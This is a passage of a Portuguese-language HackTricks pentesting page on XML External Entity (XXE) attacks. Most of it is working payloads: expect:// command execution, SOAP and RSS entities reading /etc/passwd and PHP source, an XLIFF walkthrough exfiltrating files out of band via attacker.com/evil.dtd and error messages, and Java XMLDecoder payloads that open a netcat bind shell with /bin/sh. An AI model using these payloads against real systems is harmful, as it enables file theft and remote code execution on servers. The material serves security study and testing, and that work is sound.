<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Execu√ß√£o remota de c√≥digo

**Se o m√≥dulo "expect" do PHP estiver carregado**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

Este exemplo √© inspirado em [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)

XLIFF (Formato de Arquivo de Interc√¢mbio de Localiza√ß√£o XML) √© utilizado para padronizar a troca de dados em processos de localiza√ß√£o. √â um formato baseado em XML, principalmente usado para transferir dados localiz√°veis entre ferramentas durante a localiza√ß√£o e como um formato comum de interc√¢mbio para ferramentas CAT (Tradu√ß√£o Assistida por Computador).

### An√°lise de Requisi√ß√£o Cega

Uma requisi√ß√£o √© feita ao servidor com o seguinte conte√∫do:
```xml
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
No entanto, esta solicita√ß√£o aciona um erro interno do servidor, mencionando especificamente um problema com as declara√ß√µes de marca√ß√£o:
```json
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
Apesar do erro, um acerto √© registrado no Burp Collaborator, indicando algum n√≠vel de intera√ß√£o com a entidade externa.

Exfiltra√ß√£o de Dados Fora de Banda Para exfiltrar dados, uma solicita√ß√£o modificada √© enviada:
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Esta abordagem revela que o User Agent indica o uso do Java 1.8. Uma limita√ß√£o observada nesta vers√£o do Java √© a incapacidade de recuperar arquivos que contenham um caractere de nova linha, como /etc/passwd, usando a t√©cnica Out of Band.

Exfiltra√ß√£o de Dados Baseada em Erros Para superar essa limita√ß√£o, uma abordagem Baseada em Erros √© empregada. O arquivo DTD √© estruturado da seguinte forma para acionar um erro que inclui dados de um arquivo alvo:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
O servidor responde com um erro, refletindo importantemente o arquivo inexistente, indicando que o servidor est√° tentando acessar o arquivo especificado:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
Para incluir o conte√∫do do arquivo na mensagem de erro, o arquivo DTD √© ajustado:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
Esta modifica√ß√£o leva √† exfiltra√ß√£o bem-sucedida do conte√∫do do arquivo, conforme refletido na sa√≠da de erro enviada via HTTP. Isso indica um ataque XXE (XML External Entity) bem-sucedido, aproveitando tanto t√©cnicas Out of Band quanto Error-Based para extrair informa√ß√µes sens√≠veis.

## RSS - XEE

XML v√°lido com formato RSS para explorar uma vulnerabilidade XXE.

### Ping back

Solicita√ß√£o HTTP simples para o servidor dos atacantes.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Ler arquivo
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Ler c√≥digo fonte

Usando o filtro base64 do PHP
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE para RCE

XMLDecoder √© uma classe Java que cria objetos com base em uma mensagem XML. Se um usu√°rio malicioso conseguir fazer um aplicativo usar dados arbitr√°rios em uma chamada ao m√©todo **readObject**, ele ganhar√° instantaneamente a execu√ß√£o de c√≥digo no servidor.

### Usando Runtime().exec()
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## Ferramentas

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## Refer√™ncias

* [https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\\
* [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\\
* Extrair informa√ß√µes via HTTP usando seu pr√≥prio DTD externo: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\\
* [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\\
* [https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\\
* [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\\
* [https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
